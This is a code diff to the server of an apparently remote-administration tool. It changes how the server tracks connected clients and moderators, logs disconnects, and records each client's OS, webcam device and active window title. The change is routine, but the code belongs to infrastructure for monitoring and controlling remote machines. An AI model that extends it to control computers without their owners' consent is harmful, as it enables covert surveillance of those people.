@@ -53,18 +53,27 @@ class ModeratServerProtocol(Protocol):
     def connectionLost(self, reason):
         global clients
 
-        print 'Connection Lost'
-
         # Delete Socket Entry
         try:
             for key, value in clients.items():
                 if value['socket'] == self:
-                    # Set Client Online
+                    # Set Client Offline
                     manageClients.set_client_offline(value['key'])
+                    log.info('Client (%s) Disconnected' % value['key'])
                     del clients[key]
         except KeyError:
             pass
 
+        # Delete Moderator Entry
+        try:
+            for key, value in moderators.items():
+                if value['socket'] == self:
+                    # Set Moderator Offline
+                    manageModerators.set_status(value['username'], 0)
+                    log.info('Moderator (%s) Disconnected' % value['username'])
+                    del moderators[key]
+        except KeyError:
+            pass
 
     def dataReceived(self, data):
         # Data Received
@@ -107,6 +116,7 @@ class ModeratServerProtocol(Protocol):
 
         # Clients Status Checker
         elif mode == 'infoChecker':
+            client_socket = clients[payload['key']]['socket']
             clients[payload['key']] = {
                 'ip_address':           self.transport.getHost().host,
                 'os_type':              payload['os_type'],
@@ -118,7 +128,7 @@ class ModeratServerProtocol(Protocol):
                 'webcamera_device':     payload['webcamera_device'],
                 'window_title':         payload['window_title'],
                 'key':                  payload['key'],
-                'socket':               self,
+                'socket':               client_socket,
             }
 
         else:
